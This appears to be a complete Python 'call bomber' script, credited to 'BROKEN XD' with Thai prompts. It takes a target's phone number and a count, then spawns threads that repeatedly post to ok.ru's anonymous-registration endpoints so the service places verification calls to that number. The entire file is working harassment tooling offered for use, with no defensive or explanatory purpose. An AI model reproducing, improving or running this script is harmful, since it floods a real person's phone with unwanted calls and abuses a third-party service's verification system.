import requests,json
import threading
from threading import Thread
import time
import colorama
import platform
import os
from requests import Session
from requests import get
from requests import post
from re import search
from bs4 import BeautifulSoup as bs
import requests as ru

def clear():
    so_name=platform.system()
    if so_name=='Windows':
        os.system('cls')
    else:
        os.system('clear')
clear()

print("") 
print("""\033[92m

CALL V.1
CREATE BROKEN XD
""")

print("BROKEN XD")
print("phone number : เบอร์")
print("number : จำนวน")
print("")
phone = input("\033[31mPHONE NUMBER : ")
number = int(input("\033[31mNUMBER : "))
clear()

def call():
    send = Session()
    send.headers.update({"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38","Content-Type" : "application/x-www-form-urlencoded","Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"})
    snd = send.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data=f"st.r.phone=+66{phone[1:]}")
    sed = send.post("https://ok.ru/dk?cmd=AnonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI",data="st.r.fieldAcceptCallUIButton=Call")
    
for number in range(1, number):
    threading.Thread(target=call).start()
    print("\033[OK.RU")